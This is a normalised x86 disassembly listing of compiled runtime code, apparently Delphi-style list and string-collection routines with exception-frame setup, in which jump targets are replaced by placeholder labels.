xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bc24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41c010
push esi
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
pop esi
retn
cmp [ esi + 0xc ] 0x0
jne r-xdata
test dl dl
je r-xdata
mov edx eax
xor edx edx
jmp r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_41c04c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4032e0
mov edx esp
mov eax esi
call sub_404384
add esp 0x100
pop esi
pop ebx
retn
sub_41c074
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41c109
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax [ ebx ]
call sub_4032e0
lea edx [ ebp - 0x114 ]
mov eax edi
call sub_404384
push edi
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x4 ]
mov si 0xfffe
call sub_40358c
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov eax ebx
call sub_41c034
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_4092d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c110
lea eax [ ebp - 0x14 ]
call sub_404120
retn
sub_41c12c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_41c62c
mov edx ebx
mov eax esi
call sub_41c5c4
sub_41c15c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_41c034
test eax eax
jl r-xdata
pop esi
pop ebx
retn
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
mov ecx esi
xchg edx eax
call sub_41b748
mov dl 0x1
mov eax ebx
call sub_41c010
sub_41c18c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov [ esi + 0x8 ] eax
xor ecx ecx
mov edx esi
mov eax esi
call sub_41bf44
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_41c1d8
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov [ esi + 0xc ] 0x1
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov cl 0x1
mov edx esi
mov eax esi
call sub_41bf44
mov eax [ esi + 0x8 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bc24
test bl bl
jle r-xdata
mov eax esi
call sub_41c2f0
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41c224
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_41c244
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41bc50
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41c2c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41c2f0
mov eax esi
call sub_41c3c4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc ebx
xor edi edi
mov edx edi
mov eax esi
call sub_41c3cc
push eax
mov eax [ ebp - 0x4 ]
call sub_41c224
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc edi
dec ebx
jne r-xdata
sub_41c2f0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41c34a
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_41b73c
call sub_403390
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_41c364
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx esi
call sub_41b654
cmp ebp [ eax + 0x8 ]
je r-xdata
sub_41c3a4
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41c3cc
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_41c3e0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_41c48e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebx ]
call sub_4032e0
lea edx [ ebp - 0x108 ]
mov eax edi
call sub_404384
mov eax ebx
mov si 0xffff
call sub_40358c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c495
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404144
retn
mov eax ebx
mov si 0xffff
call sub_40358c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40358c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41c4a8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4044a0
sub_41c4a8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
call sub_404174
mov eax [ ebp - 0x4 ]
mov si 0xffff
call sub_40358c
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4035d0
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4035d0
call sub_4173c8
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebx + 0x8 ]
shl eax 0x2
call sub_4027b4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41c5a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4035d0
mov edx [ ebp - 0xc ]
call sub_417604
movsx edi [ ebx + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4027d4
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + ebx * 4 ]
mov eax [ ebp - 0x10 ]
call sub_417688
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov esi [ eax + ebx * 4 ]
mov eax [ esi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
lea edx [ esi + 0x1a ]
call sub_404384
sub_41c5c4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40351c
test al al
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41b4f8
mov [ esi + 0x4 ] ebx
mov eax [ ebx + 0x10 ]
mov [ esi + 0x8 ] eax
inc [ ebx + 0x10 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor ecx ecx
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax ebx
call sub_41c2e0
xor ecx ecx
mov edx esi
mov eax ebx
call sub_41bf44
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
xor ecx ecx
mov eax [ r-xdata ]
call sub_41b5e0
sub_41c62c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov cl 0x1
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x14 ]
mov eax [ ebx + 0x8 ]
call sub_41b73c
cmp esi eax
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41b7f0
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_41b544
jmp r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
mov cl 0x1
mov edx esi
mov eax ebx
call sub_41bf44
mov eax ebx
call sub_41c2e0
pop edi
pop esi
pop ebx
retn
sub_41c690
push ecx
mov [ esp ] edx
sub cl 0x1
jb r-xdata
mov edx esp
mov ecx [ eax ]
call [ ecx + 0xc ]
pop edx
retn
dec cl
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
pop edx
retn
sub_41c6b4
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41d298
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bc24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_41c6e4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41c708
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41c72c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c7d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41c87c
xor eax eax
push ebp
push sub_41c7b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c7bd
mov eax [ ebp - 0x4 ]
call sub_41c938
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_41c7e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41bc50
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c87c
xor eax eax
push ebp
push sub_41c864
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c938
retn
sub_41c894
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41c94c
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_41c8ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41d130
mov eax [ ebp - 0x8 ]
push eax
push sub_41d48c
push ebp
call sub_41c894
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c94c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41c9e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c9e8
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404144
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_40452c
jne r-xdata
sub_41c9f8
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_41c9f4
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
jmp sub_403b5c
sub_41ca30
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41ca78
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_406030
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41c9f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca7f
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_41ca88
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41cb60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41c87c
xor eax eax
push ebp
push sub_41cb3e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cb45
mov eax [ ebp - 0x4 ]
call sub_41c938
retn
sub_41cb7c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41cbc1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4045e0
call sub_408e1c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cbc8
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_41cbd0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41ccdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4041b8
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_404210
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cce2
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404144
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4043e0
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_4043e0
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4043e0
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4029b0
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4029b0
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_4043e0
mov ebx eax
test ebx ebx
je r-xdata
sub_41ccf8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41cd77
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_404120
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_404640
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cd7e
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_41cd84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41cdfc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce03
lea eax [ ebp - 0xc ]
call sub_404120
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41ce10
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41ced3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404640
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41d51c
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404308
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c964
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ceda
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0xc ]
call sub_404120
retn
sub_41cee4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41cf18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41cf48
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41e058
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41cf90
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41cf97
mov eax [ ebp - 0x4 ]
call sub_403390
retn
sub_41cf9c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d039
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41c87c
xor eax eax
push ebp
push sub_41d01c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41dba4
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_404210
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d023
mov eax [ ebp - 0x4 ]
call sub_41c938
retn
sub_41d048
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d0e9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d0f0
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov eax [ ebp - 0x4 ]
call sub_41c87c
xor eax eax
push ebp
push sub_41d0cc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c938
retn
sub_41d0f8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
